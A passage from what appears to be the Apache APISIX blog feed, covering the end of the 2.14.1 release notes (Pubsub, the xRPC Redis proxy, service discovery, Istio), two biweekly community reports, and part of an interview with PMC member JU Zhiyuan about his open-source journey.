Every subsequent subscription operation can obtain the latest message according to the current offset.\\nNote: After the message is successfully obtained, the current offset needs to be updated, and the updated offset is the previously returned offset + 1.\\n\\nFor specific operations, please refer to the source code and test cases:\\n\\n- [kafka.t](https://github.com/apache/apisix/blob/master/t/pubsub/kafka.t)\\n- [pubsub.lua](https://github.com/apache/apisix/blob/master/t/lib/pubsub.lua)\\n\\nAlthough the current Pubsub framework only provides the low-level interface, it already fulfills the two most basic requirements:\\n\\n- Expose Kafka service capabilities through commonly used `80/443` ports, without requiring an additional layer of application server encapsulation.\\n- Allows adding authentication plug-ins to add security protection to Kafka services like using a general Websocket framework.\\n\\nIf you encounter problems during actual use, you can report to the Apache APISIX community by submitting an issue, and the community will continue to improve and enhance this function based on the feedback from users.\\n\\n## Manage non-HTTP layer 7 protocols based on the xRPC framework\\n\\nAPISIX supports proxy TCP protocol in early versions, but in some scenarios, pure TCP protocol proxy cannot meet user requirements. Because some functions can only be implemented after encoding and decoding the application protocol, users need a proxy for a specific application protocol, such as Redis Proxy, Kafka Proxy, etc.\\n\\nBeginning with APISIX v2.14.1, APISIX provides the xRPC framework, which allows developers to customize specific application protocols on the framework. Based on the xRPC framework, APISIX can provide proxy support for several major application protocols. At the same time, users can also support their own private TCP-based application protocols based on this framework, so that it has the precise granularity similar to HTTP protocol proxy and higher-level layer 7 control.\\n\\nAt present, APISIX has implemented the proxy function of Redis on the xRPC framework, which supports injecting delays and selectively recording log content according to commands. Although APISIX needs to encode and decode the Redis protocol, in a simple SET/GET performance test, using APISIX with dual worker processes as a proxy, its performance can reach 80% of the direct connection to Redis.\\n\\nYou can create a stream route that proxies the Redis protocol by referring to the following command:\\n\\n```shell\\ncurl http://127.0.0.1:9080/apisix/admin/stream_routes/1 \\\\\\n-H \'X-API-KEY: ${api-key}\' -X PUT -d \'\\n{\\n    \\"upstream\\": {\\n        \\"type\\": \\"none\\",\\n        \\"nodes\\": {\\n            \\"127.0.0.1:6379\\": 1\\n        }\\n    },\\n    \\"protocol\\": {\\n        \\"name\\": \\"redis\\",\\n        \\"conf\\": {\\n            \\"faults\\": [{\\n                \\"commands\\": [\\"get\\", \\"ping\\"],\\n                \\"delay\\": 5\\n            }]\\n        },\\n        logger = {\\n            [\\n                \\"name\\": \\"syslog\\",\\n                \\"filter\\": [\\n                    [\\"rpc_time\\", \\">=\\", 1],\\n                ],\\n                \\"conf\\": {\\n                    \\"host\\": \\"127.0.0.1\\",\\n                    \\"port\\": 8125,\\n                    \\"sock_type\\": \\"udp\\",\\n                    \\"batch_max_size\\": 1,\\n                    \\"flush_limit\\": 1\\n                }\\n            ]\\n        }\\n    }\\n}\'\\n```\\n\\nWhen the command is GET or ping, there will be a 5 second delay. At the same time, after each command is executed, it will judge whether it takes more than 1 second. If so, it will trigger the corresponding `logger` object and send the `syslog` UDP log to `127.0.0.1:8125`.\\n\\n## The Control Plane supports service discovery\\n\\nBefore v2.14.1, APISIX only supported service discovery on the data plane. In this case, each APISIX instance needs to obtain service discovery data, but users have reported the following problems in the actual application process:\\n\\n1. Each APISIX instance needs to pull data from the service discovery system, which complicates the network topology.\\n2. Service discovery configuration needs to be configured on each APISIX instance. To change the password, you must modify the configuration file and publish it to each APISIX instance.\\n3. Currently, many service discovery systems do not provide Lua SDK. If you want to use these service discovery systems, you need to directly connect to the HTTP API provided by the server (if it exists).\\n\\nTherefore, starting from v2.14.1, APISIX will support service discovery on the control plane. Service discovery will be implemented through the [APISIX-Seed](https://github.com/api7/apisix-seed/) project.\\n\\nThe principle of this function is to use `apisix-seed` to simultaneously monitor the Upstream-related resources in etcd and the corresponding upstream service resources in the service discovery component, and update the relevant Upstream information in etcd when the upstream service resources in the service discovery component change.\\n\\nThe specific implementation process is as follows:\\n\\n![error/APISIX-Seed.png](https://static.apiseven.com/202108/1653983575757-97b39a39-8bd1-4e1e-b708-a7b43976c342.png)\\n\\nAt present, the solution of the control plane service discovery also has shortcomings, such as the greater pressure on etcd. Therefore, APISIX will keep both service discovery schemes at the same time, and prove which scheme is better through more practical applications.\\n\\n## Initial support for Istio\\n\\nIn order to adapt to a wider range of application scenarios, starting from v2.14.1, APISIX will try to be compatible with Istio, and start to explore in the field of service mesh in the form of Istio as the control plane and APISIX as the Data Plane.\\n\\nSince the configuration of Istio is issued through the xDS protocol, the [Amesh](https://github.com/api7/amesh) project was developed to convert the xDS issued by Istio into the configuration of APISIX. At present, APISIX has been able to run through the official Istio Simple Bookstore App demo. In subsequent releases, APISIX will continue to expand support for xDS, bringing the capabilities of Istio and APISIX closer together.\\n\\n## More plugins and functions\\n\\nIn addition to the exploratory features mentioned above, this release also provides users with some more traditional features:\\n\\n- Added `casdoor` plugin to improve the interaction experience with Casdoor.\\n- The `response-rewrite` plugin has added a replacement filter for Body.\\n\\nFor more details on feature updates and bug fixes, please refer to the official [Releases CHANGELOG](https://github.com/apache/apisix/blob/master/CHANGELOG.md)."},{"id":"Biweekly Report (May 1 - May 15)","metadata":{"permalink":"/blog/2022/05/19/weekly-report-0519","source":"@site/blog/2022/05/19/weekly-report-0519.md","title":"Biweekly Report (May 1 - May 15)","description":"The Apache APISIX Community Weekly Report hopes to help community members better understand the weekly progress of the Apache APISIX community.","date":"2022-05-19T00:00:00.000Z","formattedDate":"May 19, 2022","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":2.6,"truncated":true,"authors":[],"prevItem":{"title":"Release Apache APISIX 2.14.1","permalink":"/blog/2022/05/31/release-apache-apisix-2.14"},"nextItem":{"title":"Biweekly Report (Apr 15 - Apr 30)","permalink":"/blog/2022/05/10/weekly-report-0510"}},"content":"> From May 1st to May 15th, 35 contributors submitted 77 commits for Apache APISIX. Thank you all for your contributions to Apache APISIX!\\n\\n\x3c!--truncate--\x3e\\n\\n## Introduction\\n\\nApache APISIX has grown as a community from the first day of open source and has quickly become the most active open source API gateway project in the world. These achievements cannot be achieved without the joint efforts of our community partners.\\n\\n\\"If you want to go fast, go alone.If you want to go far, go together.\\" The Apache APISIX Community Weekly Report hopes to help community members better understand the weekly progress of the Apache APISIX community and and facilitate everyone to participate in the Apache APISIX community.\\n\\nWe have also compiled some issues suitable for newcomers to the community to participate in! If you are interested, don\'t miss it!\\n\\n## Contributor Statistics\\n\\n![Contributors List](https://static.apiseven.com/202108/1652941223501-a03655b5-122f-4fa5-9406-3f3b33093002.png)\\n\\n![New Contributors](https://static.apiseven.com/202108/1652941259760-bc336da9-7659-4b1e-ac89-d4073bd24c5d.png)\\n\\n## Good first issue\\n\\n### Issue #7052\\n\\n**Link**: https://github.com/apache/apisix/issues/7052\\n\\n**Description**: As a User, I want to use oAuth2 with [PKCE](https://oauth.net/2/pkce/) support, so that I can configure an oAuth2 connection without using client/secret.\\n\\nI am using an IDP, which has implemented the [Authorization Code Flow](https://openid.net/specs/openid-connect-core-1_0.html#CodeFlowAuth).\\n\\nFrom the docs of the IdP:\\nThe IdP implements the Authorization Code Flow, preferably with PKCE. The PKCE flow is the recommended and most universal authorization flow that supports mobile apps, single page applications and traditional server-rendered applications and doesn\'t require the exchange of a shared secret.\\n\\nThe Flow:\\n\\n- User opens a web app (in my case an `APISIXROUTE`, using `openid` plugin)\\n- Code challenge using **SHA256** is created by the `openid` plugin\\n- Redirect to the idp authorization endpoint\\n- Login of the user\\n- Redirect to the `redirect_url` with `authcode` as URL Queryparameter\\n- `openid` plugin uses the `authcode` to receive a JWT from the idp token endpoint\\n\\nCould implement this OAuth flow with PKCE support? Please add a section to the documentation as well, introduce configuration of the PKEC and the redirect_url.\\n\\n## Issue #6939\\n\\n**Link**: https://github.com/apache/apisix/issues/6939\\n\\n**Description**: See [apisix/apisix/stream/router/ip_port.lua](https://github.com/apache/apisix/blob/dbe7eeebba06229d4a8df75263f2a78301cc1ca0/apisix/stream/router/ip_port.lua#L82) Line 82 in dbe7eee\\n\\n```Lua\\n   -- TODO: check the subordinate relationship in the Admin API\\n```\\n\\nWe need to check the subordinate relationship in the Admin API, including:\\n\\n- Validate if the stream route with superior id exists and its protocol matches the subordinate;\\n- When deleting a stream route, check if it is referenced by another stream route\\n\\n## Highlights of Recent Features\\n\\n- [xRPC support timeout](https://github.com/apache/apisix/pull/6965)\uff08Contributor: [spacewander](https://github.com/spacewander)\uff09\\n\\n- [stream port syslog plugin](https://github.com/apache/apisix/pull/6953)\uff08Contributor: [tzssangglass](https://github.com/tzssangglass)\uff09\\n\\n- [redis support pipeline](https://github.com/apache/apisix/pull/6959)\uff08Contributor: [spacewander](https://github.com/spacewander)\uff09\\n\\n- [just change uri args or headers when hiding credentials](https://github.com/apache/apisix/pull/6991)\uff08Contributor: [jwrookie](https://github.com/jwrookie)\uff09\\n\\n- [add option to normalize uri like servlet](https://github.com/apache/apisix/pull/6984)\uff08Contributor: [spacewander](https://github.com/spacewander)\uff09\\n\\n- [ops handle real_ip_from CIDR format](https://github.com/apache/apisix/pull/6981)\uff08Contributor: [kwanhur](https://github.com/kwanhur)\uff09\\n\\n- [xRPC support log filter](https://github.com/apache/apisix/pull/6960)\uff08Contributor: [tzssangglass](https://github.com/tzssangglass))\\n\\n- [add pubsub framework](https://github.com/apache/apisix/pull/7028)\uff08Contributor: [bzp2010](https://github.com/bzp2010)\uff09\\n\\n- [redis support pubsub\uff08added test\uff09](https://github.com/apache/apisix/pull/7031)\uff08Contributor: [spacewander](https://github.com/spacewander)\uff09\\n\\n- [real-ip support search recursive](https://github.com/apache/apisix/pull/6988)\uff08Contributor: [crazyMonkey1995](https://github.com/crazyMonkey1995)\uff09\\n\\n- [support hook response body for ext-plugin](https://github.com/apache/apisix/pull/6968)\uff08Contributor: [soulbird](https://github.com/soulbird)\uff09\\n\\nThe Apache APISIX project website and the Github issue have accumulated a wealth of documentation and experience, so if you encounter problems, you can read the documentation, search the issue with keywords, or participate in the discussion on the issue to put forward your own ideas and practical experience."},{"id":"Biweekly Report (Apr 15 - Apr 30)","metadata":{"permalink":"/blog/2022/05/10/weekly-report-0510","source":"@site/blog/2022/05/10/weekly-report-0510.md","title":"Biweekly Report (Apr 15 - Apr 30)","description":"The Apache APISIX Community Weekly Report hopes to help community members better understand the weekly progress of the Apache APISIX community.","date":"2022-05-10T00:00:00.000Z","formattedDate":"May 10, 2022","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":1.885,"truncated":true,"authors":[],"prevItem":{"title":"Biweekly Report (May 1 - May 15)","permalink":"/blog/2022/05/19/weekly-report-0519"},"nextItem":{"title":"Interview with JU Zhiyuan: Becoming One of the 918 ASF Members, I Felt Thrilled and Proud","permalink":"/blog/2022/04/29/interview-juzhiyuan-apache-member"}},"content":"> From April 15th to April 30th, 28 contributors submitted 88 commits for Apache APISIX. Thank you all for your contributions to Apache APISIX.\\n\\n\x3c!--truncate--\x3e\\n\\n## Introduction\\n\\nApache APISIX has grown as a community from the first day of open source and has quickly become the most active open source API gateway project in the world. These achievements cannot be achieved without the joint efforts of our community partners.\\n\\n\\"If you want to go fast, go alone.If you want to go far, go together.\\" The Apache APISIX Community Weekly Report hopes to help community members better understand the weekly progress of the Apache APISIX community and and facilitate everyone to participate in the Apache APISIX community.\\n\\nWe have also compiled some issues suitable for newcomers to the community to participate in! If you are interested, don\'t miss it!\\n\\n## Contributor Statistics\\n\\n![Contributors List](https://static.apiseven.com/202108/1652147147760-64ccf980-1c1e-473b-b04f-ee28e52cf33d.png)\\n\\n![New Contributors](https://static.apiseven.com/202108/1652147147758-9dcadcd2-7190-4846-9a5b-b0c4a1098e66.png)\\n\\n## Good first issue\\n\\n### Issue #6923\\n\\n**Link**: https://github.com/apache/apisix/issues/6923\\n\\n**Issue description**:\\n\\nAs a user, I want to let `api-breaker` plugin return the default response body. Refer to the document [api-breaker](https://apisix.apache.org/zh/docs/apisix/plugins/api-breaker/), when upstream is in the unhealthy state, the `api-breaker` returns `unhealthy.http_statuses` only, without a response body.\\n\\nIn order to be more compatible to the client, return a default response body is useful.\\n\\n## Highlights of Recent Features\\n\\n- [Inject kubernetes discovery environment variable](https://github.com/apache/apisix/pull/6869)(Contributor: [zhixiongdu027](https://github.com/zhixiongdu027))\\n\\n- [xRPC added simple redis support](https://github.com/apache/apisix/pull/6873)(Contributor: [spacewander](https://github.com/spacewander))\\n\\n- [xRPC added basic stream support](https://github.com/apache/apisix/pull/6885)\uff08Contributor: [spacewander](https://github.com/spacewander))\\n\\n- [Feat(xRPC): support dynamic upstream](https://github.com/apache/apisix/pull/6901)(Contributor: [spacewander](https://github.com/spacewander))\\n\\n- [Feat(xRPC): support dynamic upstream with upstream_id](https://github.com/apache/apisix/pull/6919)(Contributor: [spacewander](https://github.com/spacewander))\\n\\nThe Apache APISIX project website and the Github issue have accumulated a wealth of documentation and experience, so if you encounter problems, you can read the documentation, search the issue with keywords, or participate in the discussion on the issue to put forward your own ideas and practical experience.\\n\\n## Recent Blog Recommendations\\n\\n- [Best Practices for TiDB-based Apache APISIX High Availability Configuration](https://apisix.apache.org/blog/2022/04/22/apisix-with-tidb-practice)\\n\\nIn the TiDB Hackathon 2021, the APISIX team (team leader: Chao Zhang, team members: Zeping Bai, Zhengsong Tu, Jinghan Chen) presented the ability of TiDB to interface with Apache APISIX to implement a universal configuration center. In this article, we will bring you some stories behind the project and the future outlook, if you are interested in the project, please feel free to participate in the project."},{"id":"Interview with JU Zhiyuan: Becoming One of the 918 ASF Members, I Felt Thrilled and Proud","metadata":{"permalink":"/blog/2022/04/29/interview-juzhiyuan-apache-member","source":"@site/blog/2022/04/29/interview-juzhiyuan-apache-member.md","title":"Interview with JU Zhiyuan: Becoming One of the 918 ASF Members, I Felt Thrilled and Proud","description":"Become an Apache Member in 2022, we invited Ju Zhiyuan to talk about his open source experience and technology growth.","date":"2022-04-29T00:00:00.000Z","formattedDate":"April 29, 2022","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":22.17,"truncated":true,"authors":[{"name":"Estelle Rao","title":"Author","url":"https://github.com/EstelleRao","image_url":"https://github.com/EstelleRao.png","imageURL":"https://github.com/EstelleRao.png"}],"prevItem":{"title":"Biweekly Report (Apr 15 - Apr 30)","permalink":"/blog/2022/05/10/weekly-report-0510"},"nextItem":{"title":"High Availability Configuration with TiDB and APISIX","permalink":"/blog/2022/04/22/apisix-with-tidb-practice"}},"content":"> JU Zhiyuan, a PPMC member of Apache APISIX, was elected to be one of the 918 ASF Members in March 2022. In this interview, Zhiyuan shared his experience with open source and his self-learning journey in technology.\\r\\n\\r\\n\x3c!--truncate--\x3e\\r\\n\\r\\n**JU Zhiyuan (GitHub ID: juzhiyuan), born in 1997, became an Apache APISIX PPMC member in October 2019 and was elected as an ASF Member in March 2022. He is an active advocate for open source as an ApacheCon Speaker, OSPP Mentor, and GSoC Mentor and was one of the core organizers of freeCodeCamp China before 2019, spreading the word of open source and giving help and support for open-source newbies. Currently, he leads a global team in API7.ai, an open-source software company.**\\r\\n\\r\\n![ASF Members](https://static.apiseven.com/202108/1651198214277-8bb73696-dbe0-4e24-b0b9-2bb65e1abbfd.png)\\r\\n\\r\\nBack in primary school, he got his first computer. Intrigued by stunning Flash techniques, he started to teach himself technology. In junior and senior high school, he self-learned web penetration techniques, became obsessed with hacker culture, and yearned to be a WooYun member. After entering college, he joined the freeCodeCamp community and became an advocate and mentor for web technology. For the first time in his life, he was closely involved in an open-source community. After graduation, he made more contributions to open-source projects, became a PMC member of Apache APISIX, and shared his firsthand open-source experience and thoughts on the Apache Way on many public occasions.\\r\\n\\r\\nAs a PMC member of Apache APISIX, Zhiyuan deserves our respect for his contribution. Now, he has reaped another title, ASF Member Congratulations to Zhiyuan! At this merry moment, the Apache APISIX community invited Zhiyuan to talk about **his experience with open source and his self-learning journey in technology**.\\r\\n\\r\\n![Open-Source Experience](https://static.apiseven.com/202108/1651198231486-5da0a1d2-a672-414f-a73f-8ddd24095b9b.png)\\r\\n\\r\\n## Open-Source Experience\\r\\n\\r\\n**When did you get your first computer and start to program?**\\r\\n\\r\\nI got my first computer around 2003. My uncle assembled a personal computer at Zhongguancun Street in China. At first, I used it to play simple games. Later, I would play complex games such as Warcraft and CrazyRacing KartRider and watch TV dramas like Dae Jang Geum and Doraemon.\\r\\n\\r\\nThen I came into Flash because my aunt learned Flash and could do animation, and her work was recognized by a TV program featuring Yuju Opera. I thought it was very cool, so I wanted to learn Flash and persuaded my mother into buying expensive tutorials for me. I really learned a lot from my family members. I drew on their experiences to make my past, current, and future decisions.\\r\\n\\r\\nA few years passed. One day, I found that my QQ account was stolen. To get it back, I filed a complaint and found many materials to learn how hackers stole my account. The more I learned, the better I knew about Trojans, phishing, and other concepts. And I found online forums that host many hackers and hacking tutorials. Since then, I have fallen in love with hacking technology.\\r\\n\\r\\nHowever, I didn\'t know that some hacking behaviors were wrong and unjust. I only knew that hacking technology empowers me to do something magic. So at that time, I wrote some Trojan scripts, performed social engineering attacks, and stole QQ accounts and passwords. To prove my capability, I even penetrated some websites. Once I left my QQ account on the penetrated website, which I thought was cool. Then the website administrator contacted me. After knowing that I was a student, the administrator told me not to do website penetration anymore. It was the first time someone had taught me that this behavior was wrong.\\r\\n\\r\\nLater, I learned about the WooYun community and was interested in becoming one of white hat hackers. Before 2016, WooYun was a great gathering place for white hat hackers, contributing most to China\'s cybersecurity protection. As a freshman, I attended the WooYun Summit. At that time, I wanted to join this group of geeks and to communicate and learn technology, but in the end, I failed the entry test. As I learned more about hacking, I could distinguish between white hats and black hats and decide whether the behavior was right or wrong.\\r\\n\\r\\n![Homepage of the WooYun Website](https://static.apiseven.com/202108/1651198239470-d23346d4-efeb-46ff-81d3-d80a7511488a.png)\\r\\n\\r\\n**How did you get to know open source and engage in open-source communities and activities?**\\r\\n\\r\\nAfter entering college, I learned about freeCodeCamp, a non-profit organization with the mission of helping people worldwide learn to program for free and advocating for education welfare. In 2015, Miya, the organizor of freeCodeCamp China in Chengdu, introduced the community to China and began building the community in China. FreeCodeCamp China has organizers in Chengdu, Shenzhen, Hangzhou, and other cities in China. Those organizers are reputed both locally and in professions. Through the freeCodeCamp community, **I made many friends and got to know more people with different backgrounds**. I felt that I was not alone when I was in a city I had never been to.\\r\\n\\r\\nThe open-source freeCodeCamp project has ranked Top 1 on GitHub for many years, and it has tens of thousands of stars. I fixed many bugs and committed many pull requests, which was very **fulfilling**. Through the freeCodeCamp platform, we also **attracted many technology enthusiasts and helped them learn technology from scratch**. During the process, I also formed my way of doing things, including guiding people to learn web technology or get onboard. After they get aboard and become more experienced, I will let them help others. Making contributions did consume a lot of time and seemed that it didn\'t benefit you a lot, but I did gain spiritual and potential benefits. For example, I have more influence, and the takeaways I gained and the experience I accumulated are helpful in my future.\\r\\n\\r\\nIn college days, I joined various communities and activities, learning technology, sharing technology, and doing projects. I also encouraged my friends to learn technology. We often held programming activities in dormitories and computer classrooms, completed projects as a team, and even went to schools in other cities to share our experience with students.\\r\\n\\r\\nOver the past few years, I have accumulated much project experience and expanded my technology stack. However, I realized that though project practices could bring me income, it was not conducive to skill development. I found that the open-source code I used in projects was of high quality and community collaboration was patterned, so I began to study open-source code and keep abreast of open-source communities. After graduation, I joined the APISIX open-source community and contributed some code.\\r\\n\\r\\n**What is open source? In the video named [Trillions and Trillions Served](https://www.youtube.com/watch?v=JUt2nb0mgwg), Jim Jagielski, one of the co-founders of the Apache Software Foundation, pointed out that \\"for me, it\'s an acknowledgment of what I see was the old hacker culture. I mean that developers and coders contributors are artists, and I think all artists want to share the results of their craft. They want to work with aligned people. They want to hone their skills.\\" You got to know hackers early in your junior and high school and then engaged in open-source communities in college. How do you take the spirit of hackers and open source? In your opinion, is there any inheritance between hacker culture and open-source culture?**\\r\\n\\r\\nIn my opinion, a hacker is not a hacker in the pejorative sense with malicious intent to destroy or invade other people\'s computer systems. Hackers, as it means, are a group of geeks who dare to think and act and who believe in liberalism and are not bound by overt or covert rules. They make decisions and take actions based on their interest and pursuit of truth. I feel that I am one of them. Whatever difficulties I encounter, I will brave them and figure out the solution.\\r\\n\\r\\nAs for the inheritance between the hacker culture and open-source culture, I think both hackers and open-source contributors share the traits of being open to sharing and pursuing the best. The representatives are Linus Benedict Torvalds, founder of the Linux operating system and Git version control system, TJ Holowaychuk, a front-end expert engineer, and You Yuxi, founder of the front-end framework Vue.js.\\r\\n\\r\\nLinus is a geek because he puts his ideas into practice and makes them open-sourced. He created Git merely because he wanted a method to manage his code and do version control as it is iterated. Although Git and Linux have a huge following and are widely used by global users, creating untold value, Linus hasn\'t capitalized on them and the projects are still open-sourced.\\r\\n\\r\\nThe second tech expert who embodies both the hacker culture and the open-source culture is TJ, who was very popular among front-end developers and made a lot of Node.js-related tools in 2015. In 2017, he started writing back-end code using Go, a programming language more suitable in the cloud-native era. Besides, he\'s self-taught. He used to be a designer.\\r\\n\\r\\nThe third geek is Yuxi You, the author of Vue.js. He used to be a designer at Google and had never learned how to code. He wrote Vue.js because he couldn\'t find a more simple front-end framework, so in 2015 or earlier, he started to create his ideal front-end framework. At that time, the project was just a simple open-source project with little popularity, but around 2017, it jumped to be one of the top 3 open-source frameworks in the world. Yuxi changed his career from a designer to a front-end engineer and an independent open-source developer, incorporated his delicate design principles and artistic ideas into the open-source framework, and created a small but beautiful, efficient, and easy-to-use open-source project. Besides, documentation and other support of Vue.js are also very accessible, and the community is very active and completely community-driven.\\r\\n\\r\\nIn fact, behind every open source project is an open-source community. The spirit of open source is that we want to realize and share our ideas and invite more people to improve them. There are a lot of independent developers on GitHub like Yuxi You. When they have a good idea, they will strive to make it come true and open source it. With more stars and more attention, they will naturally have more influence.\\r\\n\\r\\nAs for hacker culture, I also want to recommend a book named *Hackers and Painters*. The English version of *Hackers and Painters* was published in 2004, and 10 years later, it was translated into Chinese by Yifeng Ruan, a Chinese developer and technical translator, published in 2013, and then reprinted. Upon the release of the Chinese version, it received a huge response in the Chinese IT industry and academia and was widely recognized.\\r\\n\\r\\nThe book is a collection of essays written by Paul Graham, the father of Silicon Valley entrepreneurship. It covers hacker culture, hacker growth, hackers\' contribution to the world, hackers\' methodology, and other topics. In the preface to the reprint, Yifeng Ruan wrote, \\"In my opinion, there are two reasons why *Hackers and Painters* could attract so many readers after ten years. First, he wrote not about technology but the ideas behind technology. Truth is never outdated. Second, he looked into the future instead of focusing on analyzing the status quo and reflecting on the past.\\"\\r\\n\\r\\n**You have been making contributions to APISIX since July 2019. In October 2019, APISIX was accepted as an incubating project in the Apache Incubator. Upon its graduation from the ASF, you became an Apache APISIX PMC member. Can you share your secrets in improving your skills along the way and the efforts you have made?**\\r\\n\\r\\nAfter graduation, I paid much attention to the open-source APISIX project because I liked the way that it is open-sourced and a server-side project was new to me. When I joined the community, APISIX has not been donated to the ASF. One day, Ming Wen contacted me and asked me if I could develop a dashboard for APISIX. Actually, I had no experience in this field but I wanted to go it a go, so I created the first version. The first version was rough but had the core capabilities of Apache APISIX.\\r\\n\\r\\n![Apache APISIX Dashboard V1.0](https://static.apiseven.com/202108/1651198249692-cb1180ee-b23d-4b40-86a8-ccae475534f8.png)\\r\\n\\r\\nLater, this project was donated to the ASF and became an incubating project. Upon its acceptance into the Apache Incubator, all those founding members, initial members, and I became PPMC (Podling Project Management Committee, including ASF Mentors and Initial Committers) members. It was very cool to have an Apache ID. After the project graduated from the ASF and became a top-level Apache project, we became PMC members.\\r\\n\\r\\nPMC is a project management committee responsible for clarifying the objectives of the community at present and in the future. If PMC members fail their duty, they may be voted out. As a PMC member, they have to assume all the responsibilities, including identifying and inviting active contributors to be committers to increase the vitality of projects and communities. As for the qualification of being a committer, the official documents of ASF mention that when a PMC member nominates a contributor as a committer and the number of pro votes prevails, the contributor is qualified to be a committer. Being elected as a committer is a tribute to the contributor. The whole community recognizes all the contribution and expects that the committer can make continued contribution in the future.\\r\\n\\r\\nWhen it comes to the committer qualification specific to each community, each community has the liberty to set other limitations as long as the general ASF principle is followed. In the Apache APISIX community, every contributor can be a committer, as long as the contribution, code or non-code contribution, is recognized by PMC members and the community.\\r\\n\\r\\nAs a PMC member of Apache APISIX, it is my responsibility to scout for good committers for the Apache APISIX community. Natural empathy will also guide me to engage, connect, and share, paying attention to community members. Though I haven\'t seen most contributors face-to-face, I can feel how deeply the person understands a matter based on the way the person talks and cooperates. If I think a contributor has made lots of contributions, I will take the initiative to nominate the person. Among all those PMC members, I may be the one who has nominated the most committers.\\r\\n\\r\\nContributors in the community have different experiences and backgrounds. For the community, every contributor matters. Without contributors, the community cannot move forward sustainably.\\r\\n\\r\\n**There are a total of 918 individual ASF Members. In your opinion, what made you become one of them?**\\r\\n\\r\\nAs far as I know, Ming Wen nominated me as an ASF Member for the following reasons: First, I\'m a PMC member of Apache APISIX and I\'m active in the Apache APISIX community. Second, I have participated in Google Summer of Code twice and Open Source Promotion Plan 2021 once as a tutor, helping many college students participate in open-source projects of the Apache Software Foundation. Third, I also actively participate in discussions on the Apache Community mailing list and offer help to the best of my abilities. Last, I\'m an advocate for open-source and ASF culture. I attended many conferences and recorded a few podcast recordings to let more people know about Apache culture.\\r\\n\\r\\n![52 New ASF Members in 2022](https://static.apiseven.com/202108/1651198257037-1bec2eaf-8ffa-42ed-9aee-53bcb46c2d89.png)\\r\\n\\r\\nPersonally speaking, I feel that maybe I did two things well. First, I\'m always friendly and willing to support and encourage contributors. Good communication matters in a community. Once upon a time, I got in touch with an Indian student named Ayush Das and encouraged him to participate in the Apache APISIX community and Open Source Promotion Plan 2021. During months of communication, I found that he kept learning new technologies to help the community solve problems. However, because the computer was too old, he had to restart it frequently, so the development efficiency was greatly affected. To help him study more efficiently, I decided to sponsor him with a MacBook Pro M1.\\r\\n\\r\\n![Ayush Das\'s Greeting to Zhiyuan on Happy Teacher\'s Day](https://static.apiseven.com/202108/1651198269797-6a64d882-5453-41df-bc83-7ef885537348.png)\\r\\n\\r\\nSecondly, I always encourage community members to put forward their ideas. Expressing your ideas and opinions aloud is beneficial to both the community and community members. As a PMC member of Apache APISIX, I stick to Apache\'s principles, including **The Apache Way** and **Community Over Code**, and integrate them into community governance. We have a public Dev mailing list and a Private mailing list. In the private mailing list with only PMC members, we occasionally have arguments like \\"whether a contributor can be a committer\\". On such an occasion, some PMC members may keep silent while other PMC members may actively participate in the discussion. As for me, I would like to stick to the truth and express my opinions directly.\\r\\n\\r\\n**Any plans on more open-source contributions and further engagement?**\\r\\n\\r\\nI will keep participating in community activities and contributing to the community. I still remember that from the end of 2019 to the beginning of 2020, there were very few contributors to the web project, so I encouraged people around me to contribute so that this project could survive. Now, this project has been set back by another difficulty, so I have to encourage more developers to participate.\\r\\n\\r\\nAfter joining the Apache APISIX community, my focus has been on this one community. After becoming an ASF Member, I will think from the perspective of the whole foundation and take on more responsibilities. In the future, I will split my attention among ASF projects, including Apache APISIX, incubating ASF projects, and projects that have graduated. Together with other ASF Members, we will advocate for open source, increase project vitality, and offer help and guidance. I hope that the Apache Foundation will remain evergreen in the next 20 years.\\r\\n\\r\\n## Work, Life, and Self-Taught Programming\\r\\n\\r\\n![Zhiyuan Ju](https://static.apiseven.com/202108/1651198278354-f104ab0a-3939-42c3-b0a9-c2f91bdc3999.png)\\r\\n\\r\\n**You mentioned in your blog that you were working hard to become a full-stack web developer. Why were you interested in web technology and where are you on the way to becoming a full-stack web developer?**\\r\\n\\r\\nIn my spare time in high school, I had been doing web penetration and wanted to learn web security. I was curious about how to build web services, so I began to learn web theories and principles. I have gone through three learning stages, from complete confusion to  project-driven practice and finally embracing open source and contributing to open source.\\r\\n\\r\\nIn the first stage, I had no clue about web page rendering and access. After the college entrance examination in 2015, I got my first MacBook and began to search for and learn related tutorials.\\r\\n\\r\\nIn college, I began to participate in all kinds of projects. As the saying goes, \\"practice makes perfect,\\" the more practice I had, the more experienced I was in technology.  I took on all kinds of projects, either fighting alone or working as a group team. As the number of projects increased, user needs became more complex and I was exposed to more and more technology stacks. The first project I was involved in was a full-stack project aimed at helping the Student Office to develop a content management system. I was responsible for defining user needs, UI design, front-end development, and server and database deployment. By trial and error, I finally completed this project and practiced what I learned.\\r\\n\\r\\nIn my senior year, I was exposed to open-source projects and began to follow open-source communities. Because I am self-taught in web technology, I didn\'t learn web technology systematically. Repeated project practices can bring me income, but it is not conducive to my growth in technology. By chance, I realized that the open-source code I used in projects was of high quality and community collaboration was patterned. Therefore, I decided to devote most of my time to learning the open-source project code and following open-source communities.\\r\\n\\r\\nAlthough full-stack web development involves various activities such as frontend and backend development, prototype design, UI design, testing, etc., there is no measurement for assessing whether a person has full-stack capabilities. To answer your question, I think I have achieved it. When I manage a big project, I\'m more confident than ever.\\r\\n\\r\\n**You have started to work remotely a few years ago. How do you sense the difference between remote work and freelance work?**\\r\\n\\r\\nWhen I was a sophomore, I thought that I must work freelancing instead of working remotely after graduation, but at that time, I didn\'t figure out the difference between the two things.\\r\\n\\r\\nIn 2018, I stayed in Frankfurt for half a year as an exchange student. At that time, I had my first formal remote work, and I would earn a sum of money every month. The experience was very good. Before going abroad, I have completed many projects remotely in China. Based on my experience, you can work freely as long as both parties agree on a deadline and you can meet the deadline.\\r\\n\\r\\nAfter backing to China, I worked in Netease for a while and then I joined an American company named Team 247 and continued to work remotely. That was the first time I felt strongly about the difference between remote work and freelance work. Team 247 required that every employee respond to Slack messages promptly, which made me feel a little confined.\\r\\n\\r\\nLater, I came to API7.ai, and there are some requirements for remote collaboration. At first, I was reluctant to obey these rules because there were no such rules when I joined the company. But after I had more conversations with everyone, I slowly understood the company\'s considerations in remote collaboration. Because remote work is uncommon in China and there aren\'t good practices, engineers have not developed good habits. So the company will help its employees develop good habits through remote work guidelines.\\r\\n\\r\\nIn my experience working remotely, I have found two common problems in remote collaboration. The first problem lies in that people are afraid to speak aloud. For example, when collaborating remotely, people may have these thoughts like \\"whether it\'s proper for me, an intern, to ask help from a technical 